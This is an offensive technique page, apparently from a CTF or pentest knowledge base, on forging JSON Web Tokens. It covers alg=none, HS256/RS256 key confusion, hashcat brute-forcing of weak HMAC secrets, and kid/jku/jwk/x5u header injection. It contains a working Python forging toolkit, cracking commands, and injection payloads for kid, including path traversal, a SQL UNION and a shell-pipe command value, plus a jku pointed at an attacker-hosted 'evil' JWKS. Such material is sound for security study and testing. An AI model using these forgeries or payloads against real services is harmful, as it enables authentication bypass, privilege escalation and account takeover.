---
title: "JWT - alg=none, HS/RS Confusion, Weak-Secret Brute, jku/jwk/kid/x5u Injection"
category: web
subcategory: tokens
type: technique
tags: [jwt, jws, jwe, alg-none, algorithm-confusion, hs256, rs256, key-confusion, kid-injection, jku, jwk, x5u, weak-secret, hashcat, jwt-tool, hmac, none, sql-injection, burp]
difficulty: medium
summary: "Forge JWTs via alg=none, HS256-signed-with-the-RSA-public-key confusion, brute-forcing a weak HMAC secret, or pointing jku/jwk/kid/x5u at attacker-controlled keys."
when_to_use:
  - "Auth or session is a JWT (three base64url parts split by dots, header has alg/typ)"
  - "The header exposes a kid, jku, jwk, or x5u you might control or traverse"
  - "RS256 is used and you can obtain the public key (or derive it from two tokens)"
  - "The secret looks guessable (HS256 with a short/wordlist key)"
tools: [jwt-tool, hashcat, openssl, python3, burp]
related: [java-oauth-saml-flaws, python-flask-django-attacks, php-type-juggling, deser-node-vm-escape]
---

## TL;DR

A JWT is `base64url(header).base64url(payload).base64url(signature)`. Attack the signature: set
`alg=none` (no signature), sign with HS256 using the server's *public* RSA key as the HMAC secret
(key confusion), brute a weak HMAC secret, or make the header point key resolution at a key you
control via `kid`, `jku`, `jwk`, or `x5u`.

## Recognise it

- A cookie/`Authorization: Bearer` value with two dots; the first part base64url-decodes to
  `{"alg":"...","typ":"JWT"}`.
- Header fields: `alg` (`HS256`/`RS256`/`ES256`/`none`), `kid`, `jku`, `jwk`, `x5u`, `x5c`.
- The payload has claims like `sub`, `role`, `admin`, `exp`, `iat`.
- A JWKS endpoint (`/.well-known/jwks.json`, `/jwks`) or an exposed public key.

## Theory

### Structure

```
header    {"alg":"RS256","typ":"JWT","kid":"key-1"}
payload   {"sub":"user","role":"user","exp":1893456000}
signature RS256/HS256 over base64url(header)."."base64url(payload)
```

base64url = base64 with `+`->`-`, `/`->`_`, no `=` padding.

### 1. alg=none

The `none` algorithm means "unsecured JWT": no signature. If the verifier honours it, drop the
signature and forge any claims:

```
{"alg":"none"}.{"role":"admin"}.        <- note the trailing dot, empty signature
```

Try case/format variants that slip past `alg != "none"` checks: `None`, `NONE`, `nOnE`,
`none ` (trailing space), `"alg":["none"]`. Some libraries also accept an empty `alg`.

### 2. HS256/RS256 key confusion

RS256 verifies with the RSA *public* key; HS256 verifies with a *shared secret*. If the server
uses one `verify(token, key)` call that picks the algorithm from the *token header*, you can:

1. Take the server's RSA public key (it is public).
2. Sign a forged token with **HS256** using that public key's PEM bytes as the HMAC secret.
3. The server, trusting your `alg:HS256`, verifies HMAC with the same public key it would have
   used for RS256 -> your signature checks out.

The subtlety is matching the *exact* public-key bytes the server uses (PEM with/without trailing
newline, SPKI vs PKCS1, exact whitespace). Try each encoding.

### Deriving the RSA public key from two tokens

If the public key is not published, you can often recover `n` from two RS256 tokens signed by
the same key (GCD of `s1^e - m1` and `s2^e - m2` style attacks). Tools like `rsa_sign2n`
reconstruct a usable public key from two signatures, which then feeds the confusion attack.

### 3. Weak HMAC secret brute force

HS256 security is the secret's entropy. If it is a word/short string, crack it offline:

```
hashcat -m 16500 tokens.txt wordlist.txt
john --format=HMAC-SHA256 ...            # via jwt2john
```

`-m 16500` is JWT (HMAC). Feed the whole token; hashcat cracks the secret, then you re-sign.
Common CTF secrets: `secret`, `changeme`, the framework default, the app name.

### 4. Header key-injection (kid / jku / jwk / x5u)

The header can tell the verifier *where to get the key*:

- **`kid`** (key id) is often used to look up a key by filename or DB row. Injections:
  - Path traversal: `"kid":"../../../../dev/null"` -> key is empty -> sign with empty secret.
  - `"kid":"/proc/sys/kernel/randomize_va_space"` -> predictable content as the HMAC key.
  - SQL injection: `"kid":"nonexistent' UNION SELECT 'attackerkey'-- -"` -> you control the key.
  - Command injection if `kid` feeds a shell.
- **`jwk`** (embedded key): put your *own* public key in the header; a broken verifier trusts it
  and verifies against it -> you sign with your matching private key.
- **`jku`** (JWK Set URL): point it at a JWKS you host (`"jku":"https://evil/jwks.json"`) and
  serve your own public key. Bypasses on the allowlist: open redirect on the trusted host,
  `@evil`, `#`, path traversal, SSRF to an internal reflected endpoint.
- **`x5u`** (X.509 URL) / **`x5c`** (embedded cert chain): same idea with certificates -- host a
  cert you control, or embed a self-signed chain.

### 5. JWE pitfalls

JWE (encrypted, 5 parts) has its own bugs: `alg` confusion between key-management algorithms,
`RSA1_5` (PKCS#1 v1.5) padding-oracle (Bleichenbacher / "Million Message Attack"), `dir` with a
guessable key, the classic **invalid-curve** attack on ECDH-ES, and zip-bomb via `zip:"DEF"`.
A 5-part token is JWE, not JWS -- different attack surface.

## Attack

1. Decode header/payload; note `alg` and any `kid`/`jku`/`jwk`/`x5u`.
2. Try `alg:none` (+ case variants).
3. If RS256 and you can get the public key -> HS256 key confusion.
4. If HS256 -> brute the secret with hashcat `-m 16500`.
5. If `kid` present -> traversal / SQLi / empty-key.
6. If `jwk`/`jku`/`x5u` present -> inject your own key/JWKS/cert (mind allowlist bypasses).
7. Re-sign the forged claims and replay.

## Code

```python
#!/usr/bin/env python3
"""JWT attack toolkit: decode, alg=none forge, HS256 sign/verify, HS/RS
confusion signer, and jwk/kid header injectors. Pure stdlib for HS + none;
RS verification uses `cryptography` if present.

The __main__ self-test forges an alg=none token, signs+verifies HS256, proves
key-confusion produces a token that verifies HMAC against the RSA public key,
and checks the jwk/jku/kid header builders.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import sys


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def encode(header: dict, payload: dict, sig: bytes = b"") -> str:
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return "%s.%s.%s" % (h, p, b64url(sig) if sig else "")


def decode(token: str) -> tuple[dict, dict, bytes]:
    h, p, s = token.split(".")
    return (json.loads(b64url_dec(h)), json.loads(b64url_dec(p)),
            b64url_dec(s) if s else b"")


def signing_input(token: str) -> bytes:
    h, p, _ = token.split(".")
    return ("%s.%s" % (h, p)).encode()


# --- attacks ---------------------------------------------------------------

def forge_none(payload: dict, variant: str = "none") -> str:
    """alg=none token with an empty signature."""
    return encode({"alg": variant, "typ": "JWT"}, payload, b"")


def sign_hs256(header: dict, payload: dict, secret: bytes) -> str:
    unsigned = encode(header, payload).rstrip(".")
    sig = hmac.new(secret, unsigned.encode(), hashlib.sha256).digest()
    return unsigned + "." + b64url(sig)


def verify_hs256(token: str, secret: bytes) -> bool:
    _, _, sig = decode(token)
    expected = hmac.new(secret, signing_input(token), hashlib.sha256).digest()
    return hmac.compare_digest(sig, expected)


def confusion_token(payload: dict, rsa_public_pem: bytes,
                    kid: str | None = None) -> str:
    """HS256-sign using the RSA PUBLIC KEY bytes as the HMAC secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    if kid is not None:
        header["kid"] = kid
    return sign_hs256(header, payload, rsa_public_pem)


def brute_hs256(token: str, wordlist) -> str | None:
    """Return the secret from an iterable of candidate strings, or None."""
    for w in wordlist:
        secret = w.encode() if isinstance(w, str) else w
        if verify_hs256(token, secret):
            return secret.decode(errors="replace")
    return None


def inject_jwk(payload: dict, jwk: dict) -> str:
    """Embed an attacker JWK in the header (self-signed trust bug)."""
    header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
    return encode(header, payload)          # sign with the matching private key


def inject_jku(payload: dict, jku_url: str) -> dict:
    return {"alg": "RS256", "typ": "JWT", "jku": jku_url}


def kid_payloads(attacker_key: str = "attacker") -> dict[str, str]:
    """kid values that subvert key resolution."""
    return {
        "traversal_null": "../../../../../../dev/null",
        "traversal_proc": "/proc/sys/kernel/randomize_va_space",
        "sqli_union": "x' UNION SELECT '%s'-- -" % attacker_key,
        "empty": "",
        "cmd": "x|echo %s" % attacker_key,
    }


def _self_test() -> None:
    payload = {"sub": "user", "role": "admin"}

    # alg=none forge + variants
    for v in ("none", "None", "NONE", "nOnE"):
        t = forge_none(payload, v)
        h, p, s = decode(t)
        assert h["alg"] == v and p["role"] == "admin" and s == b""
        assert t.endswith(".")               # empty signature segment

    # HS256 sign/verify round-trip
    secret = b"changeme"
    tok = sign_hs256({"alg": "HS256", "typ": "JWT"}, payload, secret)
    assert verify_hs256(tok, secret)
    assert not verify_hs256(tok, b"wrong")

    # tampering the payload breaks the signature
    h, p, s = tok.split(".")
    tampered = "%s.%s.%s" % (h, b64url(b'{"sub":"user","role":"root"}'), s)
    assert not verify_hs256(tampered, secret)

    # brute forces the secret from a wordlist
    found = brute_hs256(tok, ["a", "b", "changeme", "secret"])
    assert found == "changeme", found
    assert brute_hs256(tok, ["nope", "nada"]) is None

    # KEY CONFUSION: HS256 signed with the "public key" bytes verifies as HMAC
    fake_pubkey = (b"-----BEGIN PUBLIC KEY-----\n"
                   b"MIIBIjANBgkqAAAA...FAKE...AB\n"
                   b"-----END PUBLIC KEY-----\n")
    conf = confusion_token(payload, fake_pubkey)
    # the server would verify HMAC using the same public-key bytes
    assert verify_hs256(conf, fake_pubkey)
    assert decode(conf)[0]["alg"] == "HS256"
    # a kid can ride along
    conf_kid = confusion_token(payload, fake_pubkey, kid="../../dev/null")
    assert decode(conf_kid)[0]["kid"] == "../../dev/null"

    # jwk / jku / kid injectors
    jwk = {"kty": "RSA", "n": "attacker-modulus", "e": "AQAB", "kid": "evil"}
    jt = inject_jwk(payload, jwk)
    assert decode(jt)[0]["jwk"]["n"] == "attacker-modulus"
    jh = inject_jku(payload, "https://evil/jwks.json")
    assert jh["jku"] == "https://evil/jwks.json"
    kids = kid_payloads()
    assert kids["traversal_null"].endswith("/dev/null")
    assert "UNION SELECT" in kids["sqli_union"]
    assert kids["empty"] == ""

    # base64url with no padding decodes correctly
    assert b64url_dec(b64url(b"hello!")) == b"hello!"

    print("[ok] none(4 variants), HS256, brute, key-confusion, jwk/jku/kid verified")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        header, pl, _ = decode(sys.argv[1])
        print("header :", header)
        print("payload:", pl)
    else:
        _self_test()
```

Key-confusion with real OpenSSL commands:

```sh
# 1. get the server's RSA public key (from JWKS, TLS, or an exposed endpoint)
#    if only a cert: openssl x509 -pubkey -noout -in server.crt > pub.pem
# 2. sign a forged token with HS256 using pub.pem AS THE SECRET:
python3 jwt.py            # or:
jwt_tool <token> -X k -pk pub.pem      # jwt_tool key-confusion mode
# 3. brute a weak HS256 secret:
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

## Variants & pitfalls

- **alg=none is usually patched** but the case/format variants (`None`, array `["none"]`,
  trailing space) still catch naive `alg == "none"` checks.
- **Key confusion needs byte-exact public-key material.** PEM vs DER, SPKI vs PKCS1, a trailing
  `\n`, CRLF vs LF -- try each; `jwt_tool` iterates common forms.
- **Some libraries refuse to verify HS256 with an RSA key object** (type check) -- confusion
  only works when the code passes raw key *bytes* to a generic verify.
- **`jku`/`x5u` allowlists**: bypass with open redirect on the trusted host, `@`, `#`,
  `\`, `%2f`, or an SSRF to an endpoint that reflects your JWKS.
- **`jwk` embedded key**: only exploitable if the verifier trusts the header's key instead of a
  pinned one -- test by embedding your key and signing with its private half.
- **`kid` SQLi/traversal**: the empty-key case (`kid` -> nonexistent -> `""`) lets you sign with
  an empty HMAC secret; always try secret `""`.
- **`exp`/`nbf`/`iat`**: even a perfect forge fails if the token is expired; set a far-future
  `exp`. Some libs ignore `exp` when you set `alg:none` -- test both.
- **JWE (5 parts) is not JWS** -- do not try HS/none tricks; look at key-management `alg`,
  RSA1_5 padding oracle, or a `dir` guessable key.
- **base64url padding**: strip `=`; adding it can break strict parsers.
- **Re-signing after `kid` traversal**: if `kid` -> a known file, HMAC with that file's exact
  bytes (including trailing newline).

## Tools

- `jwt_tool` -- decode, tamper, `alg:none`, key confusion (`-X k`), `kid`/`jku` injection,
  secret cracking.
- `hashcat -m 16500` / `john` (HMAC-SHA256) -- offline HS256 secret brute force.
- `openssl x509 -pubkey`, `openssl rsa -pubout` -- extract the public key for confusion.
- `rsa_sign2n` -- recover the RSA public key from two RS256 tokens.
- jwt.io / the toolkit above for quick decode/encode.

## References

- Auth0 / RFC 7519 (JWT), RFC 7515 (JWS), RFC 7516 (JWE), RFC 7517 (JWK).
- PortSwigger Web Security Academy -- JWT attacks labs.
- ticarpi/jwt_tool -- documentation.
- Tim McLean -- "Critical vulnerabilities in JSON Web Token libraries" (alg confusion, 2015).
